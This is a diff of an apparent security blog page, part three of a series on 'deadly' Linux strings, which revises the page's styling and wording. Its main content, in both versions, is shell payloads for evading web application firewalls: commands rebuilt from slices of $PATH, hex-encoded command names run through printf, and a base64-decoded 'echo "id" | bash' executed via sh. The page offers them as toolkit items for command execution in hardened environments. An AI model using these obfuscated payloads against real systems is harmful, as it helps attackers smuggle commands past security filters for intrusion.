@@ -5,57 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Funny Deadly Linux Strings Part 3 | x0xr00t</title>
     <style>
-        :root { --bg: #080808; --panel: #101010; --border: #292929; --text: #dddddd; --green: #00ff66; --cyan: #00eaff; --muted: #888; }
-        body { margin: 0; background: radial-gradient(circle at top, #151515, #050505 65%); color: var(--text); font-family: Arial, Helvetica, sans-serif; }
-        .article { max-width: 900px; margin: auto; padding: 40px 25px; }
-        .category { color: var(--green); font-family: monospace; letter-spacing: 4px; font-weight: bold; margin-bottom: 10px; margin-top: 30px; }
-        h1 { font-size: clamp(38px, 6vw, 55px); color: white; line-height: 1.1; margin: 10px 0; }
-        .subtitle { font-size: 20px; color: var(--muted); line-height: 1.4; margin-bottom: 30px; }
-        .meta-container { display: flex; align-items: center; gap: 15px; border-bottom: 1px solid var(--border); padding-bottom: 25px; margin-bottom: 40px; }
-        .avatar { width: 50px; height: 50px; background: var(--panel); border: 1px solid var(--border); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-family: monospace; color: var(--green); font-weight: bold; }
-        .meta-info h4 { margin: 0; color: white; }
-        .meta-info p { margin: 5px 0 0 0; font-size: 14px; color: var(--muted); }
-        .content p { font-size: 18px; line-height: 1.8; margin-bottom: 25px; }
-        h2, h4.section-title { margin-top: 60px; color: white; font-size: 24px; }
-        ul { padding-left: 20px; line-height: 1.8; font-size: 18px; margin-bottom: 25px; }
-        li { margin-bottom: 10px; }
-        pre { background: #000; border: 1px solid var(--border); padding: 25px; overflow: auto; font-family: "Courier New", monospace; color: #00ff99; line-height: 1.7; margin-bottom: 25px; }
-        .artwork-credit { background: var(--panel); border: 1px solid var(--border); padding: 15px; font-size: 14px; color: var(--muted); margin-bottom: 35px; border-radius: 4px; }
-        footer { margin-top: 80px; border-top: 1px solid var(--border); padding: 40px 0; text-align: center; color: #777; font-size: 14px; }
+        :root { --bg: #080808; --panel: #101010; --border: #292929; --text: #dddddd; --green: #00ff66; --muted: #888; }
+        body { margin: 0; background: #050505; color: var(--text); font-family: 'Courier New', monospace; }
+        .article { max-width: 800px; margin: auto; padding: 40px 20px; }
+        .header { color: var(--green); margin-bottom: 20px; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
+        h1 { color: #fff; }
+        .content p { line-height: 1.6; color: #ccc; }
+        pre { background: #000; border: 1px solid var(--border); padding: 15px; color: var(--green); overflow-x: auto; }
+        .footer { margin-top: 50px; color: var(--muted); font-size: 12px; }
     </style>
 </head>
 <body>
     <div class="article">
-        <div class="category">TECHNICAL</div>
-        <h1>Funny Deadly Linux Strings Part 3</h1>
-        <div class="subtitle">Security researcher x0xr00t returns with part three of his series on deadly little Linux strings.</div>
-        <div class="meta-container">
-            <div class="avatar">x0x</div>
-            <div class="meta-info">
-                <h4>x0xr00t</h4>
-                <p>July 23, 2026 • Tip Writer</p>
-            </div>
-        </div>
-        <div class="artwork-credit"><strong>Context:</strong> Modern WAF evasion techniques.</div>
+        <div class="header">>_ x0xr00t // Funny Deadly Linux Strings - Part 3</div>
+        <h1>Runtime Recon & Environment Abuse</h1>
+        
         <div class="content">
-            <p>Hello folks, I'm back with Part 3, focusing on 2026-era evasive payloads that bypass static analysis.</p>
+            <p>Hello folks, back again. After covering escape chars and decoders in previous posts, WAFs are getting smarter. Time to step up.</p>
+            <p>Part 3 focuses on reconstructing commands from system environment variables ($PATH) and dynamic encoding to fly under the radar.</p>
             
-            <h4 class="section-title">Method 1: Slicing & Dynamic Concatenation</h4>
+            <h3>>_ Technique 1: PATH Slicing</h3>
             <pre>${PATH:0:1}u${PATH:10:1}r${PATH:0:1}b${PATH:10:1}n${PATH:0:1}e${PATH:10:1}c${PATH:10:1}h${PATH:10:1}o "id" | ${PATH:0:1}u${PATH:10:1}r${PATH:0:1}b${PATH:10:1}n${PATH:0:1}b${PATH:10:1}a${PATH:10:1}s${PATH:10:1}h</pre>
 
-            <h4 class="section-title">Method 2: Hex/Octal Encoding</h4>
+            <h3>>_ Technique 2: Inline Hex Execution</h3>
             <pre>$(printf '\x65\x63\x68\x6f') "id" | $(printf '\x62\x61\x73\x68')</pre>
 
-            <h4 class="section-title">Method 3: Base64 Dynamic Decoding</h4>
+            <h3>>_ Technique 3: Base64 Direct Execution</h3>
             <pre>sh&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;ZWNobyAiaWQiIHwgYmFzaA==)</pre>
 
-            <p>These methods allow for advanced obfuscation and command execution in restrictive environments.</p>
+            <p>Keep these in your toolkit for hardened environments.</p>
         </div>
-        <footer>
-            Funny Deadly Linux Strings Part 3
-            <br><br>
-            © 2026 Secjuice.
-        </footer>
+        <div class="footer">x0xr00t // 2026 // Part 3</div>
     </div>
 </body>
 </html>
